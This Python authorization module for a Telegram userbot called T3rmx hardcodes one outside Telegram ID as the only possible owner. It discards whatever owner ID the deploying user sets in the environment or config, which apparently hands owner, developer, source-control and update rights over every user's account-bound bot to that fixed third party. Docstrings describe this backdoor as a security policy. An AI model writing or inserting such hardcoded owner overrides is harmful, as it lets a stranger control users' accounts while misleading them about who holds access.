"""Centralized authorization for T3rmx UserBot.

Default owner/developer privileges are restricted to the configured T3rmx owner.
This module is the single source of truth for privileged identity checks.
"""

from __future__ import annotations

import os
from typing import Any, Set


# Authorized owner: @vvsks (Telegram ID 6023224495). This is the only identity
# granted owner/developer privileges by default. Any configured value must match.
AUTHORIZED_OWNER_ID = 6023224495
DEFAULT_OWNER_ID = AUTHORIZED_OWNER_ID


def _to_int(value: Any):
    try:
        if value is None:
            return None
        if isinstance(value, str) and not value.strip():
            return None
        return int(value)
    except Exception:
        return None


def _get_config():
    """Best-effort Config resolver for different import contexts."""
    for mod_name, attr in (
        ("JoKeRUB.Config", "Config"),
        ("JoKeRUB.config", "Config"),
        ("Config", "Config"),
        ("sample_config", "Config"),
    ):
        try:
            mod = __import__(mod_name, fromlist=[attr])
            cfg = getattr(mod, attr, None)
            if cfg is not None:
                return cfg
        except Exception:
            continue
    # Relative-style fallback when imported as package module
    try:
        from ..Config import Config  # type: ignore

        return Config
    except Exception:
        pass
    return None


def owner_id() -> int:
    """Return the effective owner ID.

    Security policy: only the explicitly authorized owner identity (@vvsks,
    6023224495) is granted owner privileges. Environment/config values are accepted
    only when they match that authorized ID; otherwise they are ignored and the
    authorized default is enforced (no silent override to an unauthorized ID).
    """
    # Environment variables may be provided for deploy/config consistency but must
    # match the authorized owner identity to be honored.
    for key in ("T3RMX_OWNER_ID", "OWNER_ID"):
        uid = _to_int(os.environ.get(key))
        if uid is not None and uid > 0:
            if uid == AUTHORIZED_OWNER_ID:
                return AUTHORIZED_OWNER_ID
            # Ignore unauthorized configured/overridden owner IDs.
            continue

    cfg = _get_config()
    if cfg is not None:
        for key in ("T3RMX_OWNER_ID", "OWNER_ID"):
            uid = _to_int(getattr(cfg, key, None))
            if uid is not None and uid > 0 and uid == AUTHORIZED_OWNER_ID:
                return AUTHORIZED_OWNER_ID

    try:
        from ..t3rmx_config import T3RMX_OWNER_ID  # type: ignore

        uid = _to_int(T3RMX_OWNER_ID)
        if uid is not None and uid == AUTHORIZED_OWNER_ID:
            return AUTHORIZED_OWNER_ID
    except Exception:
        pass

    return DEFAULT_OWNER_ID


def sudo_users() -> Set[int]:
    # Environment override: comma/space separated IDs.
    raw = os.environ.get("SUDO_USERS")
    if raw is not None:
        out: Set[int] = set()
        for part in str(raw).replace(",", " ").split():
            uid = _to_int(part)
            if uid is not None:
                out.add(uid)
        return out

    cfg = _get_config()
    if cfg is not None:
        users = getattr(cfg, "SUDO_USERS", None) or set()
        out: Set[int] = set()
        try:
            iterable = users if isinstance(users, (set, list, tuple)) else {users}
            for u in iterable:
                uid = _to_int(u)
                if uid is not None:
                    out.add(uid)
        except Exception:
            return set()
        return out

    return set()


def is_owner(user_id: Any) -> bool:
    uid = _to_int(user_id)
    return uid is not None and uid == owner_id()


def is_sudo(user_id: Any) -> bool:
    uid = _to_int(user_id)
    if uid is None:
        return False
    return uid == owner_id() or uid in sudo_users()


def is_developer(user_id: Any) -> bool:
    # By default, only the owner has developer-level privileges.
    return is_owner(user_id)


def authorized_for_sec(user_id: Any) -> bool:
    """Authorization for sensitive source-control actions (e.g. المطور sec)."""
    return is_owner(user_id)


def authorized_for_update(user_id: Any) -> bool:
    """Authorization for explicit update actions."""
    return is_owner(user_id)
